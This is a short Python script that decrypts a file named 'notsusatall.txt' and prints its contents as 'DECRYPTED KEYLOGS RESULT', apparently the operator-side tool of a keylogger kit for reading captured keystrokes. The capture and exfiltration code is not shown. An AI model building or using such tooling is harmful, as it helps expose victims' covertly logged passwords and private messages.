import crypto_module
import os

input_file = "notsusatall.txt"

def decrypt_log_file():
    if not os.path.exists(input_file):
        print(f"Error: File '{input_file}' not found. Make sure you downloaded the encrypted file.")
        return

    try:
        with open(input_file, "rb") as f:
            raw_data = f.read()

        encrypted_data_b64 = raw_data.strip()

        decrypted_bytes = crypto_module.decrypt_data(encrypted_data_b64)
        
        decrypted_text = decrypted_bytes.decode('utf-8')

        print("=========================================")
        print("         DECRYPTED KEYLOGS RESULT        ")
        print("=========================================")
        print(decrypted_text)
        print("=========================================")
        
        with open(input_file, "w", encoding="utf-8") as f:
            f.write(decrypted_text)

    except Exception as e:
        print(f"Decryption failed! Error: {e}")
        print("Possible causes: Wrong key or corrupted data.")

if __name__ == "__main__":
    decrypt_log_file()